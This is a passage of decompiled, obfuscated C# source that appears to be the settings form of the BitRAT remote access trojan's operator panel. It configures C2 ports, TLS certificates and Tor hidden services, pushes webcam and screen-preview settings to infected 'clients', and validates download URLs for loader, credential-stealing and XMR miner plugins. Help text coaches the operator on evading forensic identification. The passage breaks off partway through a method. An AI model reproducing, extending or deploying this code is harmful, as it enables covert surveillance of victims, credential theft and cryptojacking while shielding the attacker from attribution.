	// Token: 0x06000CD7 RID: 3287 RVA: 0x00063A14 File Offset: 0x00061C14
	private void method_30(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_126().Text, string.Empty, true) == 0)
		{
			this.vmethod_126().Text = "URL to plugin: http://site.com/loader.plg";
			this.vmethod_126().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_126().Font, FontStyle.Italic);
			this.vmethod_126().Font = font;
		}
	}

	// Token: 0x06000CD8 RID: 3288 RVA: 0x00063A78 File Offset: 0x00061C78
	private void method_31(object sender, EventArgs e)
	{
		this.vmethod_130().BackColor = Color.White;
		Font font = new Font(this.vmethod_130().Font, FontStyle.Regular);
		this.vmethod_130().Font = font;
	}

	// Token: 0x06000CD9 RID: 3289 RVA: 0x00063AB4 File Offset: 0x00061CB4
	private void method_32(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_130().Text, "URL to plugin: http://site.com/xmr64.plg", true) == 0)
		{
			this.vmethod_130().Text = string.Empty;
			this.vmethod_130().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_130().Font, FontStyle.Regular);
			this.vmethod_130().Font = font;
		}
	}

	// Token: 0x06000CDA RID: 3290 RVA: 0x00063B18 File Offset: 0x00061D18
	private void method_33(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_130().Text, string.Empty, true) == 0)
		{
			this.vmethod_130().Text = "URL to plugin: http://site.com/xmr64.plg";
			this.vmethod_130().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_130().Font, FontStyle.Italic);
			this.vmethod_130().Font = font;
		}
	}

	// Token: 0x06000CDB RID: 3291 RVA: 0x00063B7C File Offset: 0x00061D7C
	private void method_34(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_22().Text) | Conversion.Val(this.vmethod_22().Text) < 1.0 | Conversion.Val(this.vmethod_22().Text) > 65535.0 | Operators.CompareString(this.vmethod_134().Text, this.vmethod_22().Text, true) == 0)
		{
			this.vmethod_22().BackColor = Color.Red;
			return;
		}
		this.vmethod_22().BackColor = Color.White;
	}

	// Token: 0x06000CDC RID: 3292 RVA: 0x00063C18 File Offset: 0x00061E18
	private void method_35(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_134().Text) | Conversion.Val(this.vmethod_134().Text) < 1.0 | Conversion.Val(this.vmethod_134().Text) > 65535.0 | Operators.CompareString(this.vmethod_134().Text, this.vmethod_22().Text, true) == 0)
		{
			this.vmethod_134().BackColor = Color.Red;
			return;
		}
		this.vmethod_134().BackColor = Color.White;
	}

	// Token: 0x06000CDD RID: 3293 RVA: 0x00063CB4 File Offset: 0x00061EB4
	private void method_36(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_140().Text) | Conversion.Val(this.vmethod_140().Text) < 1.0 | Conversion.Val(this.vmethod_140().Text) > 50.0)
		{
			this.vmethod_140().BackColor = Color.Red;
			return;
		}
		this.vmethod_140().BackColor = Color.White;
	}

	// Token: 0x06000CDE RID: 3294 RVA: 0x00007E54 File Offset: 0x00006054
	private void method_37(object sender, EventArgs e)
	{
		Interaction.MsgBox("This is the port to be used for secure and encrypted direct communications with your clients via SSL/TLS.\r\nMake sure that the port is unique and different from the ports in your settings.\r\n\r\nNOTE: This port has to be forwarded if you wish to use it!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CDF RID: 3295 RVA: 0x00007E68 File Offset: 0x00006068
	private void method_38(object sender, EventArgs e)
	{
		Interaction.MsgBox("The Tor feature helps anonymizing data traffic between you and your clients by utilizing the Tor network.\r\n\r\nIf you decide to use the Tor feature for communication, your clients will be connected to a chain of random nodes of the Tor network whom forward the data traffic to you.\r\n\r\nUsing a Clearnet-based domain (instead of .onion) with your .exe, i.e. .com, .org, .net, etc. (especially from public services like dyndns, noip, duckdns, freedns, etc.) works perfectly fine and is sufficient in most cases without giving up too much performance, but could potentially reveal your identity by means of digital forensics/reverse engineering of your executable followed by further analysis.\r\n\r\nNOTE: Unless performance is a priority, it's highly recommended to follow the simple Tor hidden service configuration/setup in order to generate your own .onion address to be used with your .exe for enhanced anonymity and security. Using the Tor hidden service method (client connects to your .onion) requires no port forwarding.\r\n\r\nWARNING: Forwarding the Tor port when using a .onion address is dangerous and should be kept closed from public access (WAN). Leaving the port accessible from WAN may expose you to correlation attacks, which may reveal your IP.\r\n\r\nHowever, the Tor port should still be started when using a .onion address. This port is used only for local communication between Tor and " + Application.ProductName + ".", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CE0 RID: 3296 RVA: 0x00063D30 File Offset: 0x00061F30
	public void method_39()
	{
		Class130.fTorConfig_0.method_0(this.fMain_0);
		Class130.fTorConfig_0.Visible = true;
		Form fTorConfig_ = Class130.fTorConfig_0;
		bool flag = false;
		Form form = fTorConfig_;
		Rectangle rectangle;
		if (this != null)
		{
			rectangle = this.RectangleToScreen(this.ClientRectangle);
		}
		else
		{
			rectangle = Screen.FromPoint(form.Location).WorkingArea;
		}
		checked
		{
			int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
			int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
			form.Location = new Point(x, y);
			if (flag)
			{
				form.Visible = true;
			}
		}
	}

	// Token: 0x06000CE1 RID: 3297 RVA: 0x00063DD4 File Offset: 0x00061FD4
	private void method_40(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_150().Text) | Conversion.Val(this.vmethod_150().Text) > 2147483647.0 | (Conversion.Val(this.vmethod_150().Text) * 1024.0 < Conversion.Val(this.vmethod_28().Text) & Conversion.Val(this.vmethod_150().Text) != 0.0))
		{
			this.vmethod_150().BackColor = Color.Red;
			return;
		}
		this.vmethod_150().BackColor = Color.White;
	}

	// Token: 0x06000CE2 RID: 3298 RVA: 0x00063E80 File Offset: 0x00062080
	private void method_41(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_156().Text) | Conversion.Val(this.vmethod_156().Text) > 2147483647.0 | (Conversion.Val(this.vmethod_156().Text) * 1024.0 < Conversion.Val(this.vmethod_52().Text) & Conversion.Val(this.vmethod_156().Text) != 0.0))
		{
			this.vmethod_156().BackColor = Color.Red;
			return;
		}
		this.vmethod_156().BackColor = Color.White;
	}

	// Token: 0x06000CE3 RID: 3299 RVA: 0x00007E8B File Offset: 0x0000608B
	private void method_42(object sender, EventArgs e)
	{
		Interaction.MsgBox("Sets a bandwidth policy rate limit for all inbound transfers.\r\nNote: This policy governs all features.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CE4 RID: 3300 RVA: 0x00007E9F File Offset: 0x0000609F
	private void method_43(object sender, EventArgs e)
	{
		Interaction.MsgBox("Sets a bandwidth policy rate limit for all outbound transfers.\r\nNote: This policy governs all features.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CE5 RID: 3301 RVA: 0x00007EB3 File Offset: 0x000060B3
	private void method_44(object sender, EventArgs e)
	{
		this.vmethod_168().Enabled = this.vmethod_162().Enabled;
		this.vmethod_166().Enabled = this.vmethod_162().Enabled;
	}

	// Token: 0x06000CE6 RID: 3302 RVA: 0x00063F2C File Offset: 0x0006212C
	private void method_45()
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fSettings.Delegate61(this.method_45), new object[0]);
			return;
		}
		if (Class130.fSettings_0.Visible)
		{
			Class130.fSettings_0.TopMost = false;
		}
		Class130.fCertificate_0.Visible = true;
		Form fCertificate_ = Class130.fCertificate_0;
		bool flag = false;
		Form form = fCertificate_;
		Rectangle rectangle;
		if (this != null)
		{
			rectangle = this.RectangleToScreen(this.ClientRectangle);
		}
		else
		{
			rectangle = Screen.FromPoint(form.Location).WorkingArea;
		}
		checked
		{
			int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
			int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
			form.Location = new Point(x, y);
			if (flag)
			{
				form.Visible = true;
			}
			Class130.fCertificate_0.Opacity = 100.0;
			Class130.fCertificate_0.Activate();
			Class130.fCertificate_0.method_0();
		}
	}

	// Token: 0x06000CE7 RID: 3303 RVA: 0x00064020 File Offset: 0x00062220
	private void method_46(object sender, EventArgs e)
	{
		this.vmethod_170().Enabled = false;
		checked
		{
			if (Class130.struct18_0.method_0())
			{
				this.fMain_0.method_27();
				this.vmethod_170().Text = "Start socket";
			}
			else
			{
				if (!Versioned.IsNumeric(this.vmethod_22().Text) | Conversion.Val(this.vmethod_22().Text) < 1.0 | Conversion.Val(this.vmethod_22().Text) > 65535.0)
				{
					Interaction.MsgBox("Invalid port! Port must be within the range 1-65535.", MsgBoxStyle.Critical, Application.ProductName);
					this.vmethod_22().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_22().Text) > 32639.5, "65535", "1234"));
					this.vmethod_170().Enabled = true;
					return;
				}
				if (Operators.CompareString(this.vmethod_134().Text, this.vmethod_22().Text, true) == 0)
				{
					Interaction.MsgBox("Invalid port! Port must different than the Tor port.", MsgBoxStyle.Critical, Application.ProductName);
					this.vmethod_22().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_22().Text) > 32639.5, "65535", "1234"));
					this.vmethod_170().Enabled = true;
					return;
				}
				TextBox textBox;
				object text = (textBox = this.vmethod_18()).Text;
				ref object ptr = ref text;
				object obj = Strings.Len(RuntimeHelpers.GetObjectValue(ptr)) > 0 & Strings.Len(RuntimeHelpers.GetObjectValue(ptr)) <= 16;
				object operand = obj;
				textBox.Text = Conversions.ToString(text);
				if (Conversions.ToBoolean(Operators.NotObject(operand)))
				{
					Interaction.MsgBox("Invalid password! Only Ascii values are allowed.", MsgBoxStyle.Critical, Application.ProductName);
					this.vmethod_170().Enabled = true;
					return;
				}
				if (!File.Exists(Application.StartupPath + "\\data\\tls\\BitRAT.pfx"))
				{
					string[] files = Directory.GetFiles(Application.StartupPath + "\\data\\tls", "*.*", SearchOption.TopDirectoryOnly);
					for (int i = 0; i < files.Length; i++)
					{
						File.Delete(files[i]);
					}
					if (MessageBox.Show("A certificate was not found!\r\nA certificate is required before starting the socket.\r\n\r\nCreate one now?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
					{
						this.method_45();
					}
					this.vmethod_170().Enabled = true;
					return;
				}
				Class135.smethod_0().PortMain = Conversions.ToInteger(this.vmethod_22().Text);
				Class135.smethod_0().PortTor = Conversions.ToInteger(this.vmethod_134().Text);
				Class135.smethod_0().Password = this.vmethod_18().Text;
				Class135.smethod_0().HostMainIP = this.vmethod_14().Text;
				Class135.smethod_0().AutostartMain = this.vmethod_16().Checked;
				Class135.smethod_0().AutostartTor = this.vmethod_138().Checked;
				Class135.smethod_0().NetworkBandwidth = this.vmethod_120().Text;
				Class135.smethod_0().Save();
				Thread thread;
				if (Operators.CompareString(Class135.smethod_0().HostMainIP, null, true) != 0)
				{
					thread = new Thread(delegate()
					{
						fMain fMain = this.fMain_0;
						MySettings mySettings;
						int portMain = (mySettings = Class135.smethod_0()).PortMain;
						string empty = string.Empty;
						fMain.method_26(ref portMain, ref empty);
						mySettings.PortMain = portMain;
					});
				}
				else
				{
					thread = new Thread(delegate()
					{
						fMain fMain = this.fMain_0;
						MySettings mySettings;
						int portMain = (mySettings = Class135.smethod_0()).PortMain;
						MySettings mySettings2;
						string hostMainIP = (mySettings2 = Class135.smethod_0()).HostMainIP;
						fMain.method_26(ref portMain, ref hostMainIP);
						mySettings2.HostMainIP = hostMainIP;
						mySettings.PortMain = portMain;
					});
				}
				thread.Start();
				if (Class130.struct18_0.method_0())
				{
					this.vmethod_170().Text = "Stop socket";
				}
			}
			this.vmethod_170().Enabled = true;
		}
	}

	// Token: 0x06000CE8 RID: 3304 RVA: 0x00064380 File Offset: 0x00062580
	private void method_47(object sender, EventArgs e)
	{
		this.vmethod_172().Enabled = false;
		if (Class130.struct18_1.method_0())
		{
			this.fMain_0.method_29();
			this.vmethod_172().Text = "Start socket";
		}
		else
		{
			if (!Versioned.IsNumeric(this.vmethod_134().Text) | Conversion.Val(this.vmethod_134().Text) < 1.0 | Conversion.Val(this.vmethod_134().Text) > 65535.0)
			{
				Interaction.MsgBox("Invalid port! Port must be within the range 1-65535.", MsgBoxStyle.Critical, Application.ProductName);
				this.vmethod_134().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_134().Text) > 32639.5, "65535", "1234"));
				this.vmethod_172().Enabled = true;
				return;
			}
			if (Operators.CompareString(this.vmethod_134().Text, this.vmethod_22().Text, true) == 0)
			{
				Interaction.MsgBox("Invalid port! Port must different than the Tor port.", MsgBoxStyle.Critical, Application.ProductName);
				this.vmethod_134().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_134().Text) > 32639.5, "65535", "1234"));
				this.vmethod_172().Enabled = true;
				return;
			}
			TextBox textBox;
			object text = (textBox = this.vmethod_18()).Text;
			ref object ptr = ref text;
			object obj = Strings.Len(RuntimeHelpers.GetObjectValue(ptr)) > 0 & Strings.Len(RuntimeHelpers.GetObjectValue(ptr)) <= 16;
			object operand = obj;
			textBox.Text = Conversions.ToString(text);
			if (Conversions.ToBoolean(Operators.NotObject(operand)))
			{
				Interaction.MsgBox("Invalid password! Only Ascii values are allowed.", MsgBoxStyle.Critical, Application.ProductName);
				this.vmethod_172().Enabled = true;
				return;
			}
			Class135.smethod_0().PortMain = Conversions.ToInteger(this.vmethod_22().Text);
			Class135.smethod_0().PortTor = Conversions.ToInteger(this.vmethod_134().Text);
			Class135.smethod_0().Password = this.vmethod_18().Text;
			Class135.smethod_0().HostMainIP = this.vmethod_14().Text;
			Class135.smethod_0().AutostartMain = this.vmethod_16().Checked;
			Class135.smethod_0().AutostartTor = this.vmethod_138().Checked;
			Class135.smethod_0().NetworkBandwidth = this.vmethod_120().Text;
			Class135.smethod_0().Save();
			Thread thread;
			if (Operators.CompareString(Class135.smethod_0().HostMainIP, null, true) != 0)
			{
				thread = new Thread(delegate()
				{
					fMain fMain = this.fMain_0;
					MySettings mySettings;
					int portTor = (mySettings = Class135.smethod_0()).PortTor;
					string empty = string.Empty;
					fMain.method_28(ref portTor, ref empty);
					mySettings.PortTor = portTor;
				});
			}
			else
			{
				thread = new Thread(delegate()
				{
					fMain fMain = this.fMain_0;
					MySettings mySettings;
					int portTor = (mySettings = Class135.smethod_0()).PortTor;
					MySettings mySettings2;
					string hostMainIP = (mySettings2 = Class135.smethod_0()).HostMainIP;
					fMain.method_28(ref portTor, ref hostMainIP);
					mySettings2.HostMainIP = hostMainIP;
					mySettings.PortTor = portTor;
				});
			}
			thread.Start();
			if (Class130.struct18_1.method_0())
			{
				this.vmethod_172().Text = "Stop socket";
			}
		}
		this.vmethod_172().Enabled = true;
	}

	// Token: 0x06000CE9 RID: 3305 RVA: 0x0006466C File Offset: 0x0006286C
	private void method_48(object sender, EventArgs e)
	{
		if (Class130.struct18_0.method_0())
		{
			this.vmethod_170().Text = "Stop socket";
			this.vmethod_170().Refresh();
		}
		else
		{
			this.vmethod_170().Text = "Start socket";
			this.vmethod_170().Refresh();
		}
		if (Class130.struct18_1.method_0())
		{
			this.vmethod_172().Text = "Stop socket";
			this.vmethod_172().Refresh();
			return;
		}
		this.vmethod_172().Text = "Start socket";
		this.vmethod_172().Refresh();
	}

	// Token: 0x06000CEA RID: 3306 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_49(object sender, EventArgs e)
	{
	}

	// Token: 0x06000CEB RID: 3307 RVA: 0x00007EE1 File Offset: 0x000060E1
	private void method_50(object sender, EventArgs e)
	{
		this.method_39();
	}

	// Token: 0x06000CEC RID: 3308 RVA: 0x00064700 File Offset: 0x00062900
	public void method_51(bool bool_0)
	{
		if (this.vmethod_170().InvokeRequired)
		{
			this.vmethod_170().Invoke(new fSettings.GDelegate4(this.method_51), new object[]
			{
				bool_0
			});
			return;
		}
		this.vmethod_170().Enabled = bool_0;
	}

	// Token: 0x06000CED RID: 3309 RVA: 0x00064750 File Offset: 0x00062950
	public void method_52(bool bool_0)
	{
		if (this.vmethod_172().InvokeRequired)
		{
			this.vmethod_172().Invoke(new fSettings.GDelegate3(this.method_52), new object[]
			{
				bool_0
			});
			return;
		}
		this.vmethod_172().Enabled = bool_0;
	}

	// Token: 0x06000CEE RID: 3310 RVA: 0x000647A0 File Offset: 0x000629A0
	private void method_53(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_22().Text) | Conversion.Val(this.vmethod_22().Text) < 1.0 | Conversion.Val(this.vmethod_22().Text) > 65535.0)
		{
			Interaction.MsgBox("Invalid port! Port must be within the range 1-65535.", MsgBoxStyle.Critical, Application.ProductName);
			this.vmethod_22().Select();
			this.vmethod_22().Focus();
			return;
		}
		TextBox textBox;
		object text = (textBox = this.vmethod_18()).Text;
		ref object ptr = ref text;
		object obj = Strings.Len(RuntimeHelpers.GetObjectValue(ptr)) > 0 & Strings.Len(RuntimeHelpers.GetObjectValue(ptr)) <= 16;
		object operand = obj;
		textBox.Text = Conversions.ToString(text);
		if (Conversions.ToBoolean(Operators.NotObject(operand)))
		{
			Interaction.MsgBox("Invalid password! Only Ascii values are allowed.", MsgBoxStyle.Critical, Application.ProductName);
			this.vmethod_18().Select();
			this.vmethod_18().Focus();
			return;
		}
		if (this.vmethod_120().TextLength > 0)
		{
			string text2 = (textBox = this.vmethod_120()).Text;
			ref string ptr2 = ref text2;
			bool flag;
			if (true & Strings.LCase(ptr2).StartsWith("https"))
			{
				flag = false;
			}
			else
			{
				if (ptr2.ToLower().StartsWith("www."))
				{
					ptr2 = "http://" + ptr2;
				}
				flag = Regex.IsMatch(ptr2, "http(s)?://([\\w+?\\.\\w+])+([a-zA-Z0-9\\~\\!\\@\\#\\$\\%\\^\\&\\*\\(\\)_\\-\\=\\+\\\\\\/\\?\\.\\:\\;\\'\\,]*)?");
			}
			bool flag2 = flag;
			textBox.Text = text2;
			if (!flag2)
			{
				Interaction.MsgBox("Invalid URL!", MsgBoxStyle.Critical, Application.ProductName);
				this.vmethod_120().Select();
				this.vmethod_120().Focus();
				return;
			}
		}
		try
		{
			Class135.smethod_0().PortMain = Conversions.ToInteger(this.vmethod_22().Text);
			Class135.smethod_0().PortTor = Conversions.ToInteger(this.vmethod_134().Text);
			Class135.smethod_0().Password = this.vmethod_18().Text;
			Class135.smethod_0().HostMainIP = this.vmethod_14().Text;
			Class135.smethod_0().AutostartMain = this.vmethod_16().Checked;
			Class135.smethod_0().AutostartTor = this.vmethod_138().Checked;
			Class135.smethod_0().NetworkBandwidth = this.vmethod_120().Text;
			Class135.smethod_0().Save();
		}
		catch (Exception ex)
		{
			Interaction.MsgBox("Error while saving settings!\r\nError: " + ex.Message, MsgBoxStyle.Critical, Application.ProductName);
			return;
		}
		Interaction.MsgBox("Settings successfully saved!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CEF RID: 3311 RVA: 0x00064A54 File Offset: 0x00062C54
	private void method_54(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_52().Text) | Conversion.Val(this.vmethod_52().Text) < 256.0 | Conversion.Val(this.vmethod_52().Text) > 65536.0)
		{
			Interaction.MsgBox("Invalid Send buffer size! Value must be within the range 256-65536.", MsgBoxStyle.Critical, Application.ProductName);
			this.vmethod_52().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_52().Text) > 32640.0, "65536", "8192"));
			this.vmethod_52().BackColor = Color.White;
			return;
		}
		if (!Versioned.IsNumeric(this.vmethod_28().Text) | Conversion.Val(this.vmethod_28().Text) < 256.0 | Conversion.Val(this.vmethod_28().Text) > 65536.0)
		{
			Interaction.MsgBox("Invalid Receive buffer size! Value must be within the range 256-65536.", MsgBoxStyle.Critical, Application.ProductName);
			this.vmethod_28().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_28().Text) > 32640.0, "65536", "8192"));
			this.vmethod_28().BackColor = Color.White;
			return;
		}
		if (!Versioned.IsNumeric(this.vmethod_140().Text) | Conversion.Val(this.vmethod_140().Text) < 1.0 | Conversion.Val(this.vmethod_140().Text) > 50.0)
		{
			Interaction.MsgBox("Invalid maximum conccurent value! Value must be within the range 1-50.", MsgBoxStyle.Critical, Application.ProductName);
			this.vmethod_140().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_140().Text) > 50.0, "50", "5"));
			this.vmethod_140().BackColor = Color.White;
			return;
		}
		if (!Versioned.IsNumeric(this.vmethod_150().Text) | Conversion.Val(this.vmethod_150().Text) > 2147483647.0)
		{
			Interaction.MsgBox("Invalid maximum input speed value! Value must be within the range 0-" + Conversions.ToString(int.MaxValue), MsgBoxStyle.Critical, Application.ProductName);
			this.vmethod_150().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_150().Text) > 2147483647.0, int.MaxValue, 0));
			this.vmethod_150().BackColor = Color.White;
			return;
		}
		if (Conversion.Val(this.vmethod_150().Text) * 1024.0 > 0.0 & Conversion.Val(Conversion.Val(this.vmethod_150().Text) * 1024.0) < Conversion.Val(this.vmethod_28().Text))
		{
			Interaction.MsgBox("Maximum input speed value may not be lower than receive buffer size!", MsgBoxStyle.Critical, Application.ProductName);
			this.vmethod_150().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_28().Text) >= 8192.0, Conversion.Val(this.vmethod_28().Text) / 1024.0, 0));
			this.vmethod_150().BackColor = Color.White;
			return;
		}
		if (!Versioned.IsNumeric(this.vmethod_156().Text) | Conversion.Val(this.vmethod_156().Text) > 2147483647.0)
		{
			Interaction.MsgBox("Invalid maximum output speed value! Value must be within the range 0-" + Conversions.ToString(int.MaxValue), MsgBoxStyle.Critical, Application.ProductName);
			this.vmethod_156().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_156().Text) > 2147483647.0, int.MaxValue, 0));
			this.vmethod_156().BackColor = Color.White;
			return;
		}
		if (Conversion.Val(this.vmethod_156().Text) * 1024.0 > 0.0 & Conversion.Val(this.vmethod_156().Text) * 1024.0 < Conversion.Val(this.vmethod_52().Text))
		{
			Interaction.MsgBox("Maximum output speed value may not be lower than send buffer size!", MsgBoxStyle.Critical, Application.ProductName);
			this.vmethod_156().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_52().Text) >= 8192.0, Conversion.Val(this.vmethod_52().Text) / 1024.0, 0));
			this.vmethod_156().BackColor = Color.White;
			return;
		}
		checked
		{
			Class135.smethod_0().TransfersRecvBytes = (int)Math.Round(Conversion.Val(this.vmethod_28().Text));
			Class135.smethod_0().TransfersSendBytes = (int)Math.Round(Conversion.Val(this.vmethod_52().Text));
			Class135.smethod_0().TransfersConcurrentMax = (int)Math.Round(Conversion.Val(this.vmethod_140().Text));
			Class135.smethod_0().MaxBandwidthRateIn = (int)Math.Round(Conversion.Val(this.vmethod_150().Text));
			Class135.smethod_0().MaxBandwidthRateOut = (int)Math.Round(Conversion.Val(this.vmethod_156().Text));
			Class135.smethod_0().TransferReplaceExisting = this.vmethod_162().Checked;
			Class135.smethod_0().TransferReplaceFilesModified = this.vmethod_166().Checked;
			Class135.smethod_0().TransferReplaceFilesAll = this.vmethod_168().Checked;
			Class135.smethod_0().Save();
			new Thread((Class136.Class139.threadStart_0 == null) ? (Class136.Class139.threadStart_0 = new ThreadStart(Class136.Class139.class139_0._Lambda$__44-0)) : Class136.Class139.threadStart_0).Start();
			Interaction.MsgBox("Settings successfully saved!", MsgBoxStyle.Information, Application.ProductName);
		}
	}

	// Token: 0x06000CF0 RID: 3312 RVA: 0x00065078 File Offset: 0x00063278
	private void method_55(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_92().Text) | Conversion.Val(this.vmethod_92().Text) < 128.0 | Conversion.Val(this.vmethod_92().Text) > 1024.0)
		{
			Interaction.MsgBox("Invalid width for default size! Value must be within the range 128-1024.", MsgBoxStyle.Critical, Application.ProductName);
			return;
		}
		if (!Versioned.IsNumeric(this.vmethod_82().Text) | Conversion.Val(this.vmethod_82().Text) < 128.0 | Conversion.Val(this.vmethod_82().Text) > 1920.0)
		{
			Interaction.MsgBox("Invalid width for double click size! Value must be within the range 128-1920.", MsgBoxStyle.Critical, Application.ProductName);
			return;
		}
		if (!Versioned.IsNumeric(this.vmethod_86().Text) | Conversion.Val(this.vmethod_86().Text) < 128.0 | Conversion.Val(this.vmethod_86().Text) > 768.0)
		{
			Interaction.MsgBox("Invalid height for default size! Value must be within the range 128-768.", MsgBoxStyle.Critical, Application.ProductName);
			return;
		}
		if (!Versioned.IsNumeric(this.vmethod_76().Text) | Conversion.Val(this.vmethod_76().Text) < 128.0 | Conversion.Val(this.vmethod_76().Text) > 1080.0)
		{
			Interaction.MsgBox("Invalid height for double click size! Value must be within the range 128-1080.", MsgBoxStyle.Critical, Application.ProductName);
			return;
		}
		Class135.smethod_0().PreviewEnabled = this.vmethod_60().Checked;
		Class135.smethod_0().PreviewSourceScreen = this.vmethod_66().Checked;
		Class135.smethod_0().PreviewSourceWebcam = this.vmethod_62().Checked;
		Class135.smethod_0().PreviewUpdateInterval = this.vmethod_72().Value;
		Class135.smethod_0().PreviewQuality = this.vmethod_104().Value;
		checked
		{
			Class135.smethod_0().PreviewDefaultX = (int)Math.Round(Conversion.Val(this.vmethod_92().Text));
			Class135.smethod_0().PreviewDefaultY = (int)Math.Round(Conversion.Val(this.vmethod_86().Text));
			Class135.smethod_0().PreviewDoubleClickX = (int)Math.Round(Conversion.Val(this.vmethod_82().Text));
			Class135.smethod_0().PreviewDoubleClickY = (int)Math.Round(Conversion.Val(this.vmethod_76().Text));
			Class135.smethod_0().PreviewDefaultSize = Conversions.ToInteger(Strings.Replace(this.vmethod_98().Text, "%", string.Empty, 1, -1, CompareMethod.Text));
			Class135.smethod_0().PreviewDoubleClickSize = Conversions.ToInteger(Strings.Replace(this.vmethod_94().Text, "%", string.Empty, 1, -1, CompareMethod.Text));
			Class135.smethod_0().PreviewDisplayFrameData = this.vmethod_102().Checked;
			Class135.smethod_0().PreviewTransparentFrames = this.vmethod_110().Checked;
			Class135.smethod_0().Save();
			try
			{
				foreach (object obj in Class130.fMain_0.vmethod_18().Objects)
				{
					CClient cclient = (CClient)obj;
					if (cclient.PREVIEW_SCREEN_IS_ENABLED)
					{
						string sKey = cclient.sKey;
						string string_ = Conversions.ToString(Operators.ConcatenateObject(string.Concat(new string[]
						{
							"screen_preview_settings|",
							Conversions.ToString(Class135.smethod_0().PreviewUpdateInterval),
							"|",
							Conversions.ToString(Class135.smethod_0().PreviewQuality),
							"|"
						}), Interaction.IIf(cclient.fPr.bool_0, Class135.smethod_0().PreviewDoubleClickSize, Class135.smethod_0().PreviewDefaultSize)));
						string string_2 = sKey;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
					if (cclient.PREVIEW_WEBCAM_IS_ENABLED)
					{
						string sKey2 = cclient.sKey;
						string string_ = Conversions.ToString(Operators.ConcatenateObject(string.Concat(new string[]
						{
							"webcam_preview_settings|",
							Conversions.ToString(Class135.smethod_0().PreviewUpdateInterval),
							"|",
							Conversions.ToString(Class135.smethod_0().PreviewQuality),
							"|"
						}), Interaction.IIf(cclient.fPr.bool_0, Class135.smethod_0().PreviewDoubleClickSize, Class135.smethod_0().PreviewDefaultSize)));
						string string_2 = sKey2;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex2)
						{
						}
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			Interaction.MsgBox("Settings successfully saved!", MsgBoxStyle.Information, Application.ProductName);
		}
	}

	// Token: 0x06000CF1 RID: 3313 RVA: 0x00065608 File Offset: 0x00063808
	private void method_56(object sender, EventArgs e)
	{
		if (this.vmethod_126().Text.Length < 8 | !this.vmethod_126().Text.Contains("://") | !this.vmethod_126().Text.Contains("http") | !this.vmethod_126().Text.Contains("."))
		{
			Interaction.MsgBox("URL to 64-Bit loader plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
			this.vmethod_126().Select();
			this.vmethod_126().BackColor = Color.Red;
			this.vmethod_6().SelectedIndex = 3;
			return;
		}
		if (this.vmethod_44().Text.Length < 8 | !this.vmethod_44().Text.Contains("://") | !this.vmethod_44().Text.Contains("http") | !this.vmethod_44().Text.Contains("."))
		{
			Interaction.MsgBox("URL to Credentials plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
			this.vmethod_6().SelectedIndex = 3;
			this.vmethod_44().Select();
			this.vmethod_44().BackColor = Color.Red;
			return;
		}
		if (this.vmethod_42().Text.Length < 8 | !this.vmethod_42().Text.Contains("://") | !this.vmethod_42().Text.Contains("http") | !this.vmethod_42().Text.Contains("."))
		{
			Interaction.MsgBox("URL to XMR Miner plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
			this.vmethod_42().Select();
			this.vmethod_42().BackColor = Color.Red;
			this.vmethod_6().SelectedIndex = 3;
			return;
		}
		if (this.vmethod_130().Text.Length < 8 | !this.vmethod_130().Text.Contains("://") | !this.vmethod_130().Text.Contains("http") | !this.vmethod_130().Text.Contains("."))
		{
